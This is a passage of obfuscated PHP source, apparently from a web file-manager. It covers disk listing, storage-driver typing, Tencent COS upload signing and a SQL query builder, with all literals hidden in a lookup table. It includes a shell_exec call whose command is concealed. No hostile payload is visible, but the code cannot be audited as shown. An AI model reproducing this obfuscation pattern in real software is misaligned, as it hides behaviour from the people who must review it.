$Øç¿¶©¯[$ÚÜØ¤Á‡] . $—§Å¡íí[1274]; if (file_exists($‚Şû¢)) { $òç¸©˜„[] = $‚Şû¢; } } return $òç¸©˜„; } if (!function_exists($—§Å¡íí[109])) { $òç¸©˜„[] = $—§Å¡íí[827]; return $òç¸©˜„; } $ÛüÀÖÙÒ = explode($—§Å¡íí[11], shell_exec($—§Å¡íí[1275])); array_shift($ÛüÀÖÙÒ); array_pop($ÛüÀÖÙÒ); $œíğÓ‚Û = array($—§Å¡íí[1276], $—§Å¡íí[1277], $—§Å¡íí[1278], $—§Å¡íí[1279], $—§Å¡íí[1280], $—§Å¡íí[1281], $—§Å¡íí[1282], $—§Å¡íí[1283]); foreach ($ÛüÀÖÙÒ as $­Ö˜Õõ×) { $ÉŠ˜•ÆÓ = preg_split($—§Å¡íí[1284], $­Ö˜Õõ×); $‚Şû¢ = $ÉŠ˜•ÆÓ[count($ÉŠ˜•ÆÓ) - 1]; if (!strstr($ÉŠ˜•ÆÓ[0], $—§Å¡íí[1285]) || !$‚Şû¢) { continue; } $ÓÉî¦‰Ú = rtrim($‚Şû¢, $—§Å¡íí[18]) . $—§Å¡íí[18]; if (in_array($ÓÉî¦‰Ú, $œíğÓ‚Û)) { continue; } $òç¸©˜„[] = $ÓÉî¦‰Ú; } return $òç¸©˜„; } public static function isSameDisk($¯á¨¥¦ñ, $“ñÑ˜ı¡) { $Ó™Œ‰­± =& $_SERVER[¹àö™Ç¾]; if ($GLOBALS[$Ó™Œ‰­±[16]][$Ó™Œ‰­±[1271]] == $Ó™Œ‰­±[1272]) { return strtolower(substr($¯á¨¥¦ñ, 0, 1)) == strtolower(substr($“ñÑ˜ı¡, 0, 1)); } $œ—èéñ¶ = self::diskList(); $Õ”¹¿Ì½ = !1; $¸ß¸àËÛ = !1; sort($œ—èéñ¶); $œ—èéñ¶ = array_reverse($œ—èéñ¶); $¯á¨¥¦ñ = rtrim($¯á¨¥¦ñ, $Ó™Œ‰­±[18]) . $Ó™Œ‰­±[18]; $“ñÑ˜ı¡ = rtrim($“ñÑ˜ı¡, $Ó™Œ‰­±[18]) . $Ó™Œ‰­±[18]; foreach ($œ—èéñ¶ as $øŒ­È…ù) { $³”Úïï¸ = strlen($øŒ­È…ù); if (!$Õ”¹¿Ì½ && substr($¯á¨¥¦ñ, 0, $³”Úïï¸) == $øŒ­È…ù) { $Õ”¹¿Ì½ = $øŒ­È…ù; } if (!$¸ß¸àËÛ && substr($“ñÑ˜ı¡, 0, $³”Úïï¸) == $øŒ­È…ù) { $¸ß¸àËÛ = $øŒ­È…ù; } if ($Õ”¹¿Ì½ && $¸ß¸àËÛ) { break; } } return $Õ”¹¿Ì½ === $¸ß¸àËÛ; } public static function transferType($ÚÇô†®Û, $À‹é¶«Í) { $ËñÆ¼Ü¿ =& $_SERVER[¹àö™Ç¾]; $Ğ‚öÚ¯ş = self::driverType($ÚÇô†®Û); $ÙàÉÙ• = self::driverType($À‹é¶«Í); if ($Ğ‚öÚ¯ş[$ËñÆ¼Ü¿[43]] == $ÙàÉÙ•[$ËñÆ¼Ü¿[43]] && $Ğ‚öÚ¯ş[$ËñÆ¼Ü¿[1286]] == $ÙàÉÙ•[$ËñÆ¼Ü¿[1286]]) { return $ËñÆ¼Ü¿[1287]; } if ($Ğ‚öÚ¯ş[$ËñÆ¼Ü¿[43]] == $ËñÆ¼Ü¿[856] && $ÙàÉÙ•[$ËñÆ¼Ü¿[43]] == $ËñÆ¼Ü¿[117]) { return $ËñÆ¼Ü¿[1182]; } if ($Ğ‚öÚ¯ş[$ËñÆ¼Ü¿[43]] == $ËñÆ¼Ü¿[117] && $ÙàÉÙ•[$ËñÆ¼Ü¿[43]] == $ËñÆ¼Ü¿[856]) { return $ËñÆ¼Ü¿[118]; } return $ËñÆ¼Ü¿[1288]; } public static function driverType($…ùñ±öç) { $ºÍ‡Ÿ™ =& $_SERVER[¹àö™Ç¾]; $ÉŠ¢§Õ­ = str_replace($ºÍ‡Ÿ™[1289], $ºÍ‡Ÿ™[22], strtolower($…ùñ±öç->getType())); if ($ÉŠ¢§Õ­ == $ºÍ‡Ÿ™[750] || $ÉŠ¢§Õ­ == $ºÍ‡Ÿ™[1290] || $ÉŠ¢§Õ­ == $ºÍ‡Ÿ™[1291]) { $…ùñ±öç = self::defaultDriverInit(); } else { if ($ÉŠ¢§Õ­ == $ºÍ‡Ÿ™[1189] || $ÉŠ¢§Õ­ == $ºÍ‡Ÿ™[1292]) { $…ùñ±öç = IO::init($…ùñ±öç->pathParse[$ºÍ‡Ÿ™[1136]]); } } $ãŸ°Èç³ = $…ùñ±öç->path; $ÉŠ¢§Õ­ = str_replace($ºÍ‡Ÿ™[1289], $ºÍ‡Ÿ™[22], strtolower($…ùñ±öç->getType())); if ($ÉŠ¢§Õ­ == $ºÍ‡Ÿ™[117]) { return array($ºÍ‡Ÿ™[43] => $ºÍ‡Ÿ™[117], $ºÍ‡Ÿ™[1286] => $ºÍ‡Ÿ™[22], $ºÍ‡Ÿ™[88] => $ãŸ°Èç³); } return array($ºÍ‡Ÿ™[43] => $ºÍ‡Ÿ™[856], $ºÍ‡Ÿ™[1286] => $…ùñ±öç->pathDriver, $ºÍ‡Ÿ™[88] => $ãŸ°Èç³); } public static function pathDriverType($æëé”’Ø) { return $æëé”’Ø ? self::driverType(IO::init($æëé”’Ø)) : !1; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($ÆÑ×¦¾Á) { parent::__construct($ÆÑ×¦¾Á); $this->signatureVersion($_SERVER[¹àö™Ç¾][221]); } public function uploadFormData($Šç¿Ì­¥, $ÛÒ®«Ö = 3600) { $ğíˆ³İ =& $_SERVER[¹àö™Ç¾]; $˜¶¨å†¿ = $ğíˆ³İ[201]; $àİÁÑş· = $ğíˆ³İ[236]; $³Ä¶¯ûò = $ğíˆ³İ[1293]; $š—²‘ä = gmdate($ğíˆ³İ[1294], time() + $ÛÒ®«Ö); $ä’½ŸÈí = (string) time() . $ğíˆ³İ[81] . (string) (time() + $ÛÒ®«Ö); $Î—´åíú = array($ğíˆ³İ[1295] => $š—²‘ä, $ğíˆ³İ[1296] => array(array($ğíˆ³İ[1297] => $˜¶¨å†¿), array($ğíˆ³İ[1298] => $this->bucket), array($ğíˆ³İ[1299], $ğíˆ³İ[1300], $ğíˆ³İ[22]), array($ğíˆ³İ[1301] => $³Ä¶¯ûò), array($ğíˆ³İ[1302] => $àİÁÑş·), array($ğíˆ³İ[1303] => $this->accessKey), array($ğíˆ³İ[1304] => $ä’½ŸÈí))); $Î—´åíú = json_encode($Î—´åíú); $úÈØÃ¡´ = hash_hmac($ğíˆ³İ[236], $ä’½ŸÈí, $this->secret); $®¦Î†ŒÏ = sha1($Î—´åíú); $Œ×üìáç = hash_hmac($ğíˆ³İ[236], $®¦Î†ŒÏ, $úÈØÃ¡´); $Ê‚ŸÛÛû = array($ğíˆ³İ[1297] => $˜¶¨å†¿, $ğíˆ³İ[1301] => $³Ä¶¯ûò, $ğíˆ³İ[1305] => base64_encode($Î—´åíú), $ğíˆ³İ[1302] => $àİÁÑş·, $ğíˆ³İ[1303] => $this->accessKey, $ğíˆ³İ[1306] => $ä’½ŸÈí, $ğíˆ³İ[1307] => $Œ×üìáç, $ğíˆ³İ[184] => $this->getHost()); return $Ê‚ŸÛÛû; } public function fileOutLink($ÜƒÃ¶é‘) { $ø›¼¢Óí =& $_SERVER[¹àö™Ç¾]; if (substr($ÜƒÃ¶é‘, 0, 7) == $ø›¼¢Óí[1308]) { $ÜƒÃ¶é‘ = $ø›¼¢Óí[1309] . substr($ÜƒÃ¶é‘, 7); } header($ø›¼¢Óí[168] . $ÜƒÃ¶é‘); die; } } goto Cê—ŒÚá¶; dàØ±ÜâÆ·: class DbSqlite3 extends DbSqlite3Base { public function query($ÙßéÛ¯€) { $§ª­£¯¶ =& $_SERVER[¹àö™Ç¾]; if (!CacheLock::fileLock($§ª­£¯¶[23])) { return !1; } $¨™ø¬ğ = parent::query($ÙßéÛ¯€); CacheLock::fileUnLock($§ª­£¯¶[23]); return $¨™ø¬ğ; } public function execute($Ü×æìÂ­) { $ ÷¢‹ğ =& $_SERVER[¹àö™Ç¾]; if (!CacheLock::fileLock($ ÷¢‹ğ[23])) { return !1; } $¶ßã·æÑ = parent::execute($Ü×æìÂ­); CacheLock::fileUnLock($ ÷¢‹ğ[23]); return $¶ßã·æÑ; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\150\151\156\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\161" => "\75", "\156\145\x71" => "\x3c\x3e", "\147\164" => "\x3e", "\x65\x67\x74" => "\x3e\x3d", "\x6c\x74" => "\x3c", "\145\x6c\164" => "\74\x3d", "\x6e\157\x74\x6c\151\153\145" => "\x4e\x4f\x54\x20\x4c\x49\113\105", "\x6c\x69\x6b\x65" => "\114\x49\x4b\x45", "\x69\x6e" => "\x49\x4e", "\x6e\x6f\164\x69\156" => "\116\117\x54\40\x49\116", "\x6e\157\164\40\x69\x6e" => "\116\x4f\x54\40\x49\116", "\x62\145\x74\167\145\x65\x6e" => "\x42\105\x54\127\105\105\116", "\156\x6f\164\142\x65\164\x77\x65\145\x6e" => "\x4e\x4f\x54\x20\x42\105\124\x57\x45\x45\x4e", "\x6e\157\x74\x20\142\145\x74\x77\x65\x65\156" => "\116\117\124\40\x42\105\x54\127\105\x45\116"); protected $selectSql = "\x53\x45\114\x45\x43\x54\x25\x44\111\x53\x54\111\116\103\124\x25\40\x25\106\111\x45\x4c\x44\x25\40\x46\122\117\115\40\45\124\101\102\x4c\105\45\x25\112\117\x49\116\45\45\127\x48\105\x52\105\45\x25\x47\x52\117\x55\120\x25\45\x48\x41\126\111\116\107\x25\45\117\122\104\105\x52\x25\x25\114\x49\x4d\111\124\x25\40\45\125\116\x49\117\116\x25\x25\x43\117\115\x4d\x45\116\x54\45"; protected $bind = array(); public static function getInstance() { $İõßã ì = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[¹àö™Ç¾][945], $İõßã ì); } public function factory($ÎÚ¨÷Û = '') { $š±‰ Ê =& $_SERVER[¹àö™Ç¾]; $ÎÚ¨÷Û = $this->parseConfig($ÎÚ¨÷Û); if (empty($ÎÚ¨÷Û[$š±‰ Ê[946]])) { think_exception(think_lang($š±‰ Ê[947])); } $this->dbType = ucwords(strtolower($ÎÚ¨÷Û[$š±‰ Ê[946]])); $¤ßÆıìŞ = $š±‰ Ê[948] . $this->dbType; if (class_exists($¤ßÆıìŞ)) { $ì±¨º«Ş = new $¤ßÆıìŞ($ÎÚ¨÷Û); if ($š±‰ Ê[949] != strtolower($ÎÚ¨÷Û[$š±‰ Ê[946]])) { $ì±¨º«Ş->dbType = strtoupper($this->dbType); } else { $ì±¨º«Ş->dbType = $this->_getDsnType($ÎÚ¨÷Û[$š±‰ Ê[901]]); } } else { think_exception(think_lang($š±‰ Ê[950]) . $š±‰ Ê[951] . $¤ßÆıìŞ); } return $ì±¨º«Ş; } public function __call($ŒÉ¢†™ï, $Œš»Èß) { if (method_exists($this, $ŒÉ¢†™ï)) { return call_user_func_array(array($this, $ŒÉ¢†™ï), $Œš»Èß); } } protected function _getDsnType($ÄÍ„ØİŒ) { $€Ä†ê²Ë = explode($_SERVER[¹àö™Ç¾][4], $ÄÍ„ØİŒ); $²‘¢ Ğ± = strtoupper(trim($€Ä†ê²Ë[0])); return $²‘¢ Ğ±; } private function parseConfig($áÃŒËª” = '') { $·ÔŒ‹ŸÀ =& $_SERVER[¹àö™Ç¾]; if (!empty($áÃŒËª”) && is_string($áÃŒËª”)) { $áÃŒËª” = $this->parseDSN($áÃŒËª”); } elseif (is_array($áÃŒËª”)) { $áÃŒËª” = array_change_key_case($áÃŒËª”); $áÃŒËª” = array($·ÔŒ‹ŸÀ[946] => $áÃŒËª”[$·ÔŒ‹ŸÀ[952]], $·ÔŒ‹ŸÀ[873] => $áÃŒËª”[$·ÔŒ‹ŸÀ[953]], $·ÔŒ‹ŸÀ[874] => $áÃŒËª”[$·ÔŒ‹ŸÀ[954]], $·ÔŒ‹ŸÀ[871] => $áÃŒËª”[$·ÔŒ‹ŸÀ[955]], $·ÔŒ‹ŸÀ[872] => $áÃŒËª”[$·ÔŒ‹ŸÀ[956]], $·ÔŒ‹ŸÀ[31] => $áÃŒËª”[$·ÔŒ‹ŸÀ[957]], $·ÔŒ‹ŸÀ[901] => $áÃŒËª”[$·ÔŒ‹ŸÀ[958]], $·ÔŒ‹ŸÀ[27] => isset($áÃŒËª”[$·ÔŒ‹ŸÀ[959]]) ? $áÃŒËª”[$·ÔŒ‹ŸÀ[959]] : array()); } elseif (empty($áÃŒËª”)) { if (think_config($·ÔŒ‹ŸÀ[960]) && $·ÔŒ‹ŸÀ[949] != strtolower(think_config($·ÔŒ‹ŸÀ[961]))) { $áÃŒËª” = $this->parseDSN(think_config($·ÔŒ‹ŸÀ[960])); } else { $áÃŒËª” = array($·ÔŒ‹ŸÀ[946] => think_config($·ÔŒ‹ŸÀ[961]), $·ÔŒ‹ŸÀ[873] => think_config($·ÔŒ‹ŸÀ[962]), $·ÔŒ‹ŸÀ[874] => think_config($·ÔŒ‹ŸÀ[963]), $·ÔŒ‹ŸÀ[871] => think_config($·ÔŒ‹ŸÀ[964]), $·ÔŒ‹ŸÀ[872] => think_config($·ÔŒ‹ŸÀ[965]), $·ÔŒ‹ŸÀ[31] => think_config($·ÔŒ‹ŸÀ[250]), $·ÔŒ‹ŸÀ[901] => think_config($·ÔŒ‹ŸÀ[960]), $·ÔŒ‹ŸÀ[27] => think_config($·ÔŒ‹ŸÀ[966])); } } return $áÃŒËª”; } protected function initConnect($íù£÷ãë = true) { if (1 == think_config($_SERVER[¹àö™Ç¾][32])) { $this->_linkID = $this->multiConnect($íù£÷ãë); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $õ¨ßí´ø => $¥…Åëğ×) { $this->_linkID = $¥…Åëğ×; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($Ï«Ğ€±ü = false) { $§Íëâ×¬ =& $_SERVER[¹àö™Ç¾]; static $†ñÎÉç² = array(); static $¦ÛÛ˜Ÿ = -1; if (empty($†ñÎÉç²)) { foreach ($this->config as $ú‰‡Æ»Ğ => $±øÖ÷) { $†ñÎÉç²[$ú‰‡Æ»Ğ] = explode($§Íëâ×¬[60], $±øÖ÷); } } if (think_config($§Íëâ×¬[967])) { if ($Ï«Ğ€±ü || think_config($§Íëâ×¬[397]) === !0) { $·ÉĞ¬ÀÛ = floor(mt_rand(0, think_config($§Íëâ×¬[968]) - 1)); $¦ÛÛ˜Ÿ = $·ÉĞ¬ÀÛ; } else { if (is_numeric(think_config($§Íëâ×¬[969]))) { $·ÉĞ¬ÀÛ = think_config($§Íëâ×¬[969]); } else { $·ÉĞ¬ÀÛ = floor(mt_rand(think_config($§Íëâ×¬[968]), count($†ñÎÉç²[$§Íëâ×¬[871]]) - 1)); } } } else { $·ÉĞ¬ÀÛ = floor(mt_rand(0, count($†ñÎÉç²[$§Íëâ×¬[871]]) - 1)); $¦ÛÛ˜Ÿ = $·ÉĞ¬ÀÛ; } $·ÉĞ¬ÀÛ = $¦ÛÛ˜Ÿ !== -1 ? $¦ÛÛ˜Ÿ : $·ÉĞ¬ÀÛ; $‚š‹ëïë = array($§Íëâ×¬[873] => isset($†ñÎÉç²[$§Íëâ×¬[873]][$·ÉĞ¬ÀÛ]) ? $†ñÎÉç²[$§Íëâ×¬[873]][$·ÉĞ¬ÀÛ] : $†ñÎÉç²[$§Íëâ×¬[873]][0], $§Íëâ×¬[874] => isset($†ñÎÉç²[$§Íëâ×¬[874]][$·ÉĞ¬ÀÛ]) ? $†ñÎÉç²[$§Íëâ×¬[874]][$·ÉĞ¬ÀÛ] : $†ñÎÉç²[$§Íëâ×¬[874]][0], $§Íëâ×¬[871] => isset($†ñÎÉç²[$§Íëâ×¬[871]][$·ÉĞ¬ÀÛ]) ? $†ñÎÉç²[$§Íëâ×¬[871]][$·ÉĞ¬ÀÛ] : $†ñÎÉç²[$§Íëâ×¬[871]][0], $§Íëâ×¬[872] => isset($†ñÎÉç²[$§Íëâ×¬[872]][$·ÉĞ¬ÀÛ]) ? $†ñÎÉç²[$§Íëâ×¬[872]][$·ÉĞ¬ÀÛ] : $†ñÎÉç²[$§Íëâ×¬[872]][0], $§Íëâ×¬[31] => isset($†ñÎÉç²[$§Íëâ×¬[31]][$·ÉĞ¬ÀÛ]) ? $†ñÎÉç²[$§Íëâ×¬[31]][$·ÉĞ¬ÀÛ] : $†ñÎÉç²[$§Íëâ×¬[31]][0], $§Íëâ×¬[901] => isset($†ñÎÉç²[$§Íëâ×¬[901]][$·ÉĞ¬ÀÛ]) ? $†ñÎÉç²[$§Íëâ×¬[901]][$·ÉĞ¬ÀÛ] : $†ñÎÉç²[$§Íëâ×¬[901]][0], $§Íëâ×¬[27] => isset($†ñÎÉç²[$§Íëâ×¬[27]][$·ÉĞ¬ÀÛ]) ? $†ñÎÉç²[$§Íëâ×¬[27]][$·ÉĞ¬ÀÛ] : $†ñÎÉç²[$§Íëâ×¬[27]][0]); return $this->connect($‚š‹ëïë, $·ÉĞ¬ÀÛ); } public function parseDSN($¯¹òĞíò) { $Á¤î¶ =& $_SERVER[¹àö™Ç¾]; if (empty($¯¹òĞíò)) { return !1; } $àœÄÚšø = parse_url($¯¹òĞíò); if ($àœÄÚšø[$Á¤î¶[183]]) { $ËÛŒŒÍ = array($Á¤î¶[946] => $àœÄÚšø[$Á¤î¶[183]], $Á¤î¶[873] => isset($àœÄÚšø[$Á¤î¶[594]]) ? $àœÄÚšø[$Á¤î¶[594]] : $Á¤î¶[22], $Á¤î¶[874] => isset($àœÄÚšø[$Á¤î¶[970]]) ? $àœÄÚšø[$Á¤î¶[970]] : $Á¤î¶[22], $Á¤î¶[871] => isset($àœÄÚšø[$Á¤î¶[184]]) ? $àœÄÚšø[$Á¤î¶[184]] : $Á¤î¶[22], $Á¤î¶[872] => isset($àœÄÚšø[$Á¤î¶[185]]) ? $àœÄÚšø[$Á¤î¶[185]] : $Á¤î¶[22], $Á¤î¶[31] => isset($àœÄÚšø[$Á¤î¶[88]]) ? substr($àœÄÚšø[$Á¤î¶[88]], 1) : $Á¤î¶[22]); } else { preg_match($Á¤î¶[971], trim($¯¹òĞíò), $ùæŸ»Ç); $ËÛŒŒÍ = array($Á¤î¶[946] => $ùæŸ»Ç[1], $Á¤î¶[873] => $ùæŸ»Ç[2], $Á¤î¶[874] => $ùæŸ»Ç[3], $Á¤î¶[871] => $ùæŸ»Ç[4], $Á¤î¶[872] => $ùæŸ»Ç[5], $Á¤î¶[31] => $ùæŸ»Ç[6]); } $ËÛŒŒÍ[$Á¤î¶[901]] = $Á¤î¶[22]; return $ËÛŒŒÍ; } protected function debug() { $Ç÷‰’¯î =& $_SERVER[¹àö™Ç¾]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $Ç÷‰’¯î[972]; if (think_config($Ç÷‰’¯î[973])) { think_status($Ç÷‰’¯î[974]); think_trace($this->queryStr . $Ç÷‰’¯î[975] . think_status($Ç÷‰’¯î[34], $Ç÷‰’¯î[974], 6) . $Ç÷‰’¯î[976], $Ç÷‰’¯î[22], $Ç÷‰’¯î[977]); } } protected function parseLock($¹­ˆÎ€ë = false) { $¤ç”êÎÆ =& $_SERVER[¹àö™Ç¾]; if (!$¹­ˆÎ€ë) { return $¤ç”êÎÆ[22]; } if ($¤ç”êÎÆ[903] == $this->dbType) { return $¤ç”êÎÆ[978]; } return $¤ç”êÎÆ[979]; } protected function parseSet($£¿Š¬«) { $·»¸¬Ÿß =& $_SERVER[¹àö™Ç¾]; foreach ($£¿Š¬« as $á¡ã³†» => $ùŒôÊ“¨) { if (is_array($ùŒôÊ“¨) && $·»¸¬Ÿß[301] == $ùŒôÊ“¨[0]) { $³èÓ¶šÍ[] = $this->parseKey($á¡ã³†») . $·»¸¬Ÿß[869] . $ùŒôÊ“¨[1]; } elseif (is_scalar($ùŒôÊ“¨) || is_null($ùŒôÊ“¨)) { $³èÓ¶šÍ[] = $this->parseKey($á¡ã³†») . $·»¸¬Ÿß[869] . $this->parseValue($ùŒôÊ“¨); } } return $·»¸¬Ÿß[980] . implode($·»¸¬Ÿß[60], $³èÓ¶šÍ); } protected function bindParam($‚áä‰¸ü, $ï¡¶œò†) { $this->bind[$_SERVER[¹àö™Ç¾][4] . $‚áä‰¸ü] = $ï¡¶œò†; } protected function parseBind($œ˜¿«ù) { $œ˜¿«ù = array_merge($this->bind, $œ˜¿«ù); $this->bind = array(); return $œ˜¿«ù; } function parseKey(&$’Õ€°î°, $±Øäû¾ˆ = true) { if ($±Øäû¾ˆ) { $’Õ€°î° = $this->parseKeyCheck($’Õ€°î°); } return $’Õ€°î°; } function parseKeyCheck($ ÒŠ•ê) { $¤²‘ÀÚ¼ =& $_SERVER[¹àö™Ç¾]; $ ÒŠ•ê = trim($ ÒŠ•ê); if (!preg_match($¤²‘ÀÚ¼[981], $ ÒŠ•ê)) { think_exception($¤²‘ÀÚ¼[982] . $ ÒŠ•ê); } return $ ÒŠ•ê; } protected function parseValue($öÇˆ™„Ã) { $˜ì–…Â· =& $_SERVER[¹àö™Ç¾]; if (is_string($öÇˆ™„Ã)) { $öÇˆ™„Ã = $˜ì–…Â·[942] . $this->escapeString($öÇˆ™„Ã) . $˜ì–…Â·[942]; } elseif (isset($öÇˆ™„Ã[0]) && is_string($öÇˆ™„Ã[0]) && strtolower($öÇˆ™„Ã[0]) == $˜ì–…Â·[301]) { $öÇˆ™„Ã = $this->escapeString($öÇˆ™„Ã[1]); } elseif (is_array($öÇˆ™„Ã)) { $öÇˆ™„Ã = array_map(array($this, $˜ì–…Â·[943]), $öÇˆ™„Ã); } elseif (is_bool($öÇˆ™„Ã)) { $öÇˆ™„Ã = $öÇˆ™„Ã ? $˜ì–…Â·[99] : $˜ì–…Â·[200]; } elseif (is_null($öÇˆ™„Ã)) { $öÇˆ™„Ã = $˜ì–…Â·[114]; } return $öÇˆ™„Ã; } protected function parseField($ğµö©ø¶) { $ÃÛİÔÕ˜ =& $_SERVER[¹àö™Ç¾]; if (is_string($ğµö©ø¶) && strpos($ğµö©ø¶, $ÃÛİÔÕ˜[60])) { $ğµö©ø¶ = explode($ÃÛİÔÕ˜[60], $ğµö©ø¶); } if (is_array($ğµö©ø¶)) { $¬şá´Á = array(); foreach ($ğµö©ø¶ as $õÕñËÈİ => $©òÌù¨µ) { if (!is_numeric($õÕñËÈİ)) { $¬şá´Á[] = $this->parseKey($õÕñËÈİ, !1) . $ÃÛİÔÕ˜[983] . $this->parseKey($©òÌù¨µ); } else { $¬şá´Á[] = $this->parseKey($©òÌù¨µ); } } $ïåôûºç = implode($ÃÛİÔÕ˜[60], $¬şá´Á); } elseif (is_string($ğµö©ø¶) && !empty($ğµö©ø¶)) { $ïåôûºç = $ğµö©ø¶; } else { $ïåôûºç = $ÃÛİÔÕ˜[191]; } return $ïåôûºç; } protected function parseTable($Û®‡ÑÃş) { $äÓÅ¾÷Š =& $_SERVER[¹àö™Ç¾]; if (is_array($Û®‡ÑÃş)) { $ùÌ€Ğ÷ = array(); foreach ($Û®‡ÑÃş as $Í¢‡Éê => $òÖ÷–¸Ü) { if (!is_numeric($Í¢‡Éê)) { $ùÌ€Ğ÷[] = $this->parseKey($Í¢‡Éê) . $äÓÅ¾÷Š[63] . $this->parseKey($òÖ÷–¸Ü); } else { $ùÌ€Ğ÷[] = $this->parseKey($Í¢‡Éê); } } $Û®‡ÑÃş = $ùÌ€Ğ÷; } elseif (is_string($Û®‡ÑÃş)) { if (strstr($Û®‡ÑÃş, $äÓÅ¾÷Š[63])) { return $Û®‡ÑÃş; } $Û®‡ÑÃş = explode($äÓÅ¾÷Š[60], $Û®‡ÑÃş); array_walk($Û®‡ÑÃş, array($this, $äÓÅ¾÷Š[891])); } return $äÓÅ¾÷Š[885] . trim(implode($äÓÅ¾÷Š[984], $Û®‡ÑÃş), $äÓÅ¾÷Š[389]) . $äÓÅ¾÷Š[885]; } protected function parseWhere($¿ÜØâ‘ƒ) { $˜öìë™º =& $_SERVER[¹àö™Ç¾]; $€™İè¿˜ = $˜öìë™º[22]; if (is_string($¿ÜØâ‘ƒ)) { $€™İè¿˜ = $¿ÜØâ‘ƒ; } else { $ìèùƒ = isset($¿ÜØâ‘ƒ[$˜öìë™º[985]]) ? strtoupper($¿ÜØâ‘ƒ[$˜öìë™º[985]]) : $˜öìë™º[22]; if (in_array($ìèùƒ, array($˜öìë™º[986], $˜öìë™º[987], $˜öìë™º[988]))) { $ìèùƒ = $˜öìë™º[63] . $ìèùƒ . $˜öìë™º[63]; unset($¿ÜØâ‘ƒ[$˜öìë™º[985]]); } else { $ìèùƒ = $˜öìë™º[989]; } foreach ($¿ÜØâ‘ƒ as $Ø¿¤ø¯¹ => $”¹©ò¸ä) { $€™İè¿˜ .= $˜öìë™º[281]; if (is_numeric($Ø¿¤ø¯¹)) { $Ø¿¤ø¯¹ = $˜öìë™º[990]; } if (0 === strpos($Ø¿¤ø¯¹, $˜öìë™º[21])) { $€™İè¿˜ .= $this->parseThinkWhere($Ø¿¤ø¯¹, $”¹©ò¸ä); } else { if (!preg_match($˜öìë™º[991], trim($Ø¿¤ø¯¹))) { think_exception(think_lang($˜öìë™º[992]) . $˜öìë™º[4] . $Ø¿¤ø¯¹); } $‘¶¤©ö® = is_array($”¹©ò¸ä) && isset($”¹©ò¸ä[$˜öìë™º[993]]); $Ø¿¤ø¯¹ = trim($Ø¿¤ø¯¹); if (strpos($Ø¿¤ø¯¹, $˜öìë™º[287])) { $şß‡©œÛ = explode($˜öìë™º[287], $Ø¿¤ø¯¹); $İüåê‘µ = array(); foreach ($şß‡©œÛ as $á‰Ó” · => $Àò¿¡Ü”) { $ÇÆŞáÕ˜ = $‘¶¤©ö® ? $”¹©ò¸ä[$á‰Ó” ·] : $”¹©ò¸ä; $İüåê‘µ[] = $˜öìë™º[264] . $this->parseWhereItem($this->parseKey($Àò¿¡Ü”), $ÇÆŞáÕ˜) . $˜öìë™º[890]; } $€™İè¿˜ .= implode($˜öìë™º[994], $İüåê‘µ); } elseif (strpos($Ø¿¤ø¯¹, $˜öìë™º[288])) { $şß‡©œÛ = explode($˜öìë™º[288], $Ø¿¤ø¯¹); $İüåê‘µ = array(); foreach ($şß‡©œÛ as $á‰Ó” · => $Àò¿¡Ü”) { $ÇÆŞáÕ˜ = $‘¶¤©ö® ? $”¹©ò¸ä[$á‰Ó” ·] : $”¹©ò¸ä; $İüåê‘µ[] = $˜öìë™º[264] . $this->parseWhereItem($this->parseKey($Àò¿¡Ü”), $ÇÆŞáÕ˜) . $˜öìë™º[890]; } $€™İè¿˜ .= implode($˜öìë™º[989], $İüåê‘µ); } else { $€™İè¿˜ .= $this->parseWhereItem($this->parseKey($Ø¿¤ø¯¹), $”¹©ò¸ä); } } $€™İè¿˜ .= $˜öìë™º[282] . $ìèùƒ; } $€™İè¿˜ = substr($€™İè¿˜, 0, -strlen($ìèùƒ)); } return empty($€™İè¿˜) ? $˜öìë™º[22] : $˜öìë™º[995] . $€™İè¿˜; } protected function parseWhereItem($ØòÚ”ÌÔ, $ê°Ğªáà) { $¨¦È«§ =& $_SERVER[¹àö™Ç¾]; $û–÷¸éÁ = $¨¦È«§[22]; if (is_array($ê°Ğªáà)) { if (is_string($ê°Ğªáà[0])) { $“…ı›” = strtolower($ê°Ğªáà[0]); if (in_array($ê°Ğªáà[0], array($¨¦È«§[869], $¨¦È«§[996], $¨¦È«§[997], $¨¦È«§[998], $¨¦È«§[999], $¨¦È«§[1000]))) { $û–÷¸éÁ .= $ØòÚ”ÌÔ . $¨¦È«§[63] . $ê°Ğªáà[0] . $¨¦È«§[63] . $this->parseValue($ê°Ğªáà[1]); } elseif (preg_match($¨¦È«§[1001], $ê°Ğªáà[0])) { $û–÷¸éÁ .= $ØòÚ”ÌÔ . $¨¦È«§[63] . $this->exp[$“…ı›”] . $¨¦È«§[63] . $this->parseValue($ê°Ğªáà[1]); } elseif (preg_match($¨¦È«§[1002], $ê°Ğªáà[0])) { if (is_array($ê°Ğªáà[1])) { $ñø¹ø› = isset($ê°Ğªáà[2]) ? strtoupper($ê°Ğªáà[2]) : $¨¦È«§[987]; if (in_array($ñø¹ø›, array($¨¦È«§[986], $¨¦È«§[987], $¨¦È«§[988]))) { $ò½‹ÚÎ = array(); foreach ($ê°Ğªáà[1] as $ï¤’Õ×) { $ò½‹ÚÎ[] = $ØòÚ”ÌÔ . $¨¦È«§[63] . $this->exp[$“…ı›”] . $¨¦È«§[63] . $this->parseValue($ï¤’Õ×); } $û–÷¸éÁ .= $¨¦È«§[264] . implode($¨¦È«§[63] . $ñø¹ø› . $¨¦È«§[63], $ò½‹ÚÎ) . $¨¦È«§[890]; } } else { $û–÷¸éÁ .= $ØòÚ”ÌÔ . $¨¦È«§[63] . $this->exp[$“…ı›”] . $¨¦È«§[63] . $this->parseValue($ê°Ğªáà[1]); } } elseif ($¨¦È«§[301] == $“…ı›”) { $û–÷¸éÁ .= $¨¦È«§[888] . $ØòÚ”ÌÔ . $¨¦È«§[63] . $ê°Ğªáà[1] . $¨¦È«§[1003]; } elseif 